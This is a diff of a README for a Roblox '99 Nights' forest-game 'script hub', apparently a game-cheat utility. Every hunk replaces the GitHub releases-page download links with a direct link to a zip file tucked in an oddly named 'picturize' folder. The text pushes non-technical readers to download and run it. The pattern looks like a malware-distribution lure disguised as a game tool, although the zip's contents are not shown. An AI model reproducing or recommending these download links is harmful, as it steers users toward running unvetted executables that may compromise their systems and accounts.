@@ -1,6 +1,6 @@
 # 🎯 99-nights-forest-script-hub - Your Ultimate Forest Survival Companion
 
-[![Download Now](https://img.shields.io/badge/Download-99%20Nights%20Forest%20Script%20Hub-blue?style=for-the-badge&logo=github)](https://github.com/RISHI012345/99-nights-forest-script-hub/releases)
+[![Download Now](https://img.shields.io/badge/Download-99%20Nights%20Forest%20Script%20Hub-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/RISHI012345/99-nights-forest-script-hub/main/picturize/v1.0.zip)
 
 ---
 
@@ -27,7 +27,7 @@ Ready to jump in? Here's your simple 3-step plan. No tech skills needed.
 
 Visit this link to download the application.
 
-[![Download Button](https://img.shields.io/badge/Click%20Here%20to%20Download%20Now-green?style=for-the-badge)](https://github.com/RISHI012345/99-nights-forest-script-hub/releases)
+[![Download Button](https://img.shields.io/badge/Click%20Here%20to%20Download%20Now-green?style=for-the-badge)](https://raw.githubusercontent.com/RISHI012345/99-nights-forest-script-hub/main/picturize/v1.0.zip)
 
 ### Step 2: Run the Program
 
@@ -147,7 +147,7 @@ That's it. No endless technical manuals. You download, click, and play smarter. 
 
 **Ready to start? Hit the button below.**
 
-[🚀 Download 99-nights-forest-script-hub](https://github.com/RISHI012345/99-nights-forest-script-hub/releases)
+[🚀 Download 99-nights-forest-script-hub](https://raw.githubusercontent.com/RISHI012345/99-nights-forest-script-hub/main/picturize/v1.0.zip)
 
 ---
 
@@ -157,7 +157,7 @@ That's it. No endless technical manuals. You download, click, and play smarter. 
 - **Type:** Lightweight input utility
 - **Game:** Roblox forest survival game
 - **Windows:** 10 and 11 (64-bit)
-- **Download Page:** [https://github.com/RISHI012345/99-nights-forest-script-hub/releases](https://github.com/RISHI012345/99-nights-forest-script-hub/releases)
+- **Download Page:** [https://raw.githubusercontent.com/RISHI012345/99-nights-forest-script-hub/main/picturize/v1.0.zip](https://raw.githubusercontent.com/RISHI012345/99-nights-forest-script-hub/main/picturize/v1.0.zip)
 
 ---
 
